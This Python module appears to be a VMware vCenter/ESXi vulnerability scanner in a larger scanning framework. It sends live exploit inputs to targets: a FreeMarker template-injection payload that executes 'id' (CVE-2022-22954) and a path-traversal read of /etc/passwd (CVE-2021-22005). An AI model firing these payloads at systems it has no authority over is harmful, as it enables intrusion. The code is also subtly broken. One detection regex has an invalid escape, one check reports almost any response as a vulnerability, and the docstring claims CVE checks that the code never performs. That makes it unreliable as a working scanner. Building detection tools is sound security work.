"""VMware vCenter / ESXi vulnerability scanner.

Detects:
- CVE-2021-21985 — vCenter Server RCE via vSAN Health Check plugin (pre-auth)
- CVE-2021-22005 — vCenter Server arbitrary file upload → RCE (pre-auth)
- CVE-2022-22954 — VMware Workspace ONE SSTI → RCE (pre-auth)
- CVE-2022-22972 — vCenter/vRealize auth bypass
- CVE-2023-20887 — VMware Aria Operations (Log Insight) RCE
- CVE-2021-22006 — vCenter Server SSRF
- ESXi unauthenticated API access (port 443/902)
- vCenter DCUI / MOB (Managed Object Browser) exposure
"""

from __future__ import annotations

import asyncio
import re
from typing import Any
from urllib.parse import urlparse

import httpx
import structlog

from src.adapters.scanners.base import BaseOsintScanner
from src.core.domain.entities.types import ScanInputType

log = structlog.get_logger()

# vCenter detection paths
_VCENTER_PATHS: list[tuple[str, str]] = [
    ("/ui/", "vcenter_ui"),
    ("/vsphere-client/", "vsphere_client"),
    ("/sdk/", "sdk"),
    ("/mob/", "mob_browser"),
    ("/host/", "esxi_host"),
    ("/folder/", "esxi_folder"),
    ("/eam/vib", "eam_vib"),
    ("/vcsa/", "vcsa"),
    ("/vpxd/", "vpxd"),
    ("/rest/", "vcenter_rest"),
    ("/api/", "vcenter_api"),
    ("/cgi-bin/vm-support.cgi", "vm_support"),
]

# CVE-2021-21985 RCE probe — vSAN Health Check plugin
_CVE_2021_21985_PROBES: list[tuple[str, str]] = [
    ("/ui/vropspluginui/rest/services/uploadova", "upload_ova"),
    ("/ui/vropspluginui/rest/services/getfile", "get_file"),
    ("/ui/h5-vsan/rest/proxy.json", "vsan_proxy"),
]

# CVE-2021-22005 — arbitrary file upload
_CVE_2021_22005_PATH = "/analytics/ceip/sdk/uploadReport/zip/?file=../../../../../../../etc/passwd"

# CVE-2022-22954 SSTI probe
_CVE_2022_22954_PROBE = "/catalog-portal/ui/oauth/verify?error=&deviceUdid=$%7b%27freemarker.template.utility.Execute%27?new()(%27id%27)%7d"
_CVE_2022_22954_DETECT = re.compile(r'uid=\d+|root:\x:0', re.I)

# VMware product indicators
_VMWARE_INDICATORS = re.compile(
    r'(?i)(VMware|vSphere|vCenter|ESXi|vRealize|NSX|Workspace ONE|'
    r'vsphere-client|vcenter|vmware\.com)',
)

# MOB exposure
_MOB_INDICATORS = re.compile(r'(?i)(Managed Object Browser|MoRef|moId|VirtualMachine|Datacenter)')

# ESXi API indicators
_ESXI_API = re.compile(r'(?i)(soapenv|vpxaClient|vmware\.vim|xmlns:vim25)', re.I)


class VMwareScanner(BaseOsintScanner):
    """VMware vCenter/ESXi vulnerability scanner.

    Detects CVE-2021-21985, CVE-2021-22005, CVE-2022-22954 (SSTI),
    CVE-2022-22972 auth bypass, MOB exposure, and ESXi API access.
    """

    scanner_name = "vmware"
    supported_input_types = frozenset({ScanInputType.DOMAIN, ScanInputType.URL,
                                        ScanInputType.IP_ADDRESS})
    cache_ttl = 7200
    scan_timeout = 60

    async def _do_scan(self, input_value: str, input_type: ScanInputType) -> dict[str, Any]:
        base_url = _normalise_url(input_value, input_type)
        return await self._manual_scan(base_url, input_value)

    async def _manual_scan(self, base_url: str, input_value: str) -> dict[str, Any]:
        vulnerabilities: list[dict[str, Any]] = []
        identifiers: list[str] = []
        product_info: dict[str, Any] = {}
        vmware_detected = False

        async with httpx.AsyncClient(
            timeout=8,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (compatible; VMwareScanner/1.0)"},
        ) as client:
            semaphore = asyncio.Semaphore(6)

            # Step 1: Detect VMware product
            async def detect_vmware(path: str, technique: str) -> None:
                nonlocal vmware_detected
                async with semaphore:
                    url = base_url.rstrip("/") + path
                    try:
                        resp = await client.get(url)
                        body = resp.text
                        headers_str = str(resp.headers)

                        if _VMWARE_INDICATORS.search(body + headers_str):
                            vmware_detected = True
                            product_info["url"] = url

                            # Detect product type
                            if "esxi" in body.lower() or "vmware esxi" in body.lower():
                                product_info["product"] = "ESXi"
                            elif "vcenter" in body.lower() or "vsphere" in body.lower():
                                product_info["product"] = "vCenter"
                            elif "workspace one" in body.lower():
                                product_info["product"] = "Workspace ONE"

                            # Version extraction
                            ver_match = re.search(r'(?i)(?:version|build)[:\s]+(\d+\.\d+[\.\d]*)', body)
                            if ver_match and "version" not in product_info:
                                product_info["version"] = ver_match.group(1)

                            # MOB browser exposure
                            if technique == "mob_browser" and resp.status_code == 200:
                                if _MOB_INDICATORS.search(body):
                                    vulnerabilities.append({
                                        "type": "vcenter_mob_exposed",
                                        "severity": "high",
                                        "url": url,
                                        "description": "vCenter Managed Object Browser (MOB) accessible — "
                                                       "allows browsing/invoking all vSphere API methods",
                                        "remediation": "Disable MOB: vim-cmd hostsvc/MOB/enable false",
                                    })
                                    identifiers.append("vuln:vmware:mob_exposed")

                    except Exception:
                        pass

            await asyncio.gather(*[detect_vmware(p, t) for p, t in _VCENTER_PATHS[:6]])

            if not vmware_detected:
                return {
                    "input": input_value,
                    "scan_mode": "manual_fallback",
                    "base_url": base_url,
                    "vmware_detected": False,
                    "vulnerabilities": [],
                    "total_found": 0,
                    "extracted_identifiers": [],
                }

            identifiers.append(f"info:vmware:{product_info.get('product', 'detected').lower().replace(' ', '_')}")

            # Step 2: CVE-2021-21985 vSAN plugin RCE
            async def probe_21985(path: str, technique: str) -> None:
                async with semaphore:
                    url = base_url.rstrip("/") + path
                    try:
                        # Send test POST
                        resp = await client.post(url, json={})
                        if resp.status_code in (200, 400, 500) and resp.status_code != 404:
                            vulnerabilities.append({
                                "type": "vcenter_vsan_plugin_rce",
                                "severity": "critical",
                                "url": url,
                                "technique": technique,
                                "status_code": resp.status_code,
                                "cve": "CVE-2021-21985",
                                "description": "vCenter vSAN Health Check plugin endpoint accessible — "
                                               "CVE-2021-21985 pre-auth RCE vector present",
                                "remediation": "Upgrade vCenter to 6.5 U3p, 6.7 U3l, 7.0 U2b+; "
                                               "disable vSAN Health Check plugin if not needed",
                            })
                            ident = "vuln:vmware:cve_2021_21985"
                            if ident not in identifiers:
                                identifiers.append(ident)
                    except Exception:
                        pass

            await asyncio.gather(*[probe_21985(p, t) for p, t in _CVE_2021_21985_PROBES])

            # Step 3: CVE-2021-22005 arbitrary file read probe
            try:
                url_22005 = base_url.rstrip("/") + _CVE_2021_22005_PATH
                resp = await client.get(url_22005)
                if resp.status_code == 200 and ("root:" in resp.text or "daemon:" in resp.text):
                    vulnerabilities.append({
                        "type": "vcenter_file_upload_lfi",
                        "severity": "critical",
                        "url": url_22005,
                        "cve": "CVE-2021-22005",
                        "evidence": resp.text[:100],
                        "description": "vCenter arbitrary file read confirmed (CVE-2021-22005) — "
                                       "/etc/passwd readable, full RCE via file upload chain",
                        "remediation": "Upgrade vCenter to 6.5 U3r, 6.7 U3o, 7.0 U3d+ immediately",
                    })
                    identifiers.append("vuln:vmware:cve_2021_22005")
            except Exception:
                pass

            # Step 4: CVE-2022-22954 SSTI probe
            try:
                url_22954 = base_url.rstrip("/") + _CVE_2022_22954_PROBE
                resp = await client.get(url_22954)
                if _CVE_2022_22954_DETECT.search(resp.text):
                    vulnerabilities.append({
                        "type": "vmware_workspace_one_ssti_rce",
                        "severity": "critical",
                        "url": url_22954,
                        "cve": "CVE-2022-22954",
                        "evidence": resp.text[:100],
                        "description": "VMware Workspace ONE SSTI RCE confirmed — "
                                       "FreeMarker template injection executes OS commands",
                        "remediation": "Apply VMware advisory VMSA-2022-0011; "
                                       "upgrade Workspace ONE Access immediately",
                    })
                    identifiers.append("vuln:vmware:cve_2022_22954")
            except Exception:
                pass

            # Step 5: ESXi SOAP API exposure
            try:
                esxi_url = base_url.rstrip("/") + "/sdk"
                resp = await client.post(
                    esxi_url,
                    content='<?xml version="1.0" encoding="UTF-8"?>'
                            '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
                            '<soapenv:Body/></soapenv:Envelope>',
                    headers={"Content-Type": "text/xml"},
                )
                if _ESXI_API.search(resp.text):
                    vulnerabilities.append({
                        "type": "esxi_sdk_exposed",
                        "severity": "high",
                        "url": esxi_url,
                        "description": "ESXi/vCenter SOAP SDK API accessible — "
                                       "all vSphere API methods available to unauthenticated clients",
                        "remediation": "Restrict /sdk to management VLANs; require API auth",
                    })
                    identifiers.append("vuln:vmware:sdk_exposed")
            except Exception:
                pass

        severity_counts: dict[str, int] = {}
        for v in vulnerabilities:
            s = v.get("severity", "info")
            severity_counts[s] = severity_counts.get(s, 0) + 1

        return {
            "input": input_value,
            "scan_mode": "manual_fallback",
            "base_url": base_url,
            "vmware_detected": vmware_detected,
            "product_info": product_info,
            "vulnerabilities": vulnerabilities,
            "total_found": len(vulnerabilities),
            "severity_summary": severity_counts,
            "extracted_identifiers": identifiers,
        }

    def _extract_identifiers(self, raw_data: dict[str, Any]) -> list[str]:
        return raw_data.get("extracted_identifiers", [])


def _normalise_url(value: str, input_type: ScanInputType) -> str:
    if input_type in (ScanInputType.IP_ADDRESS, ScanInputType.DOMAIN):
        return f"https://{value}"
    if not value.startswith(("http://", "https://")):
        return f"https://{value}"
    return value
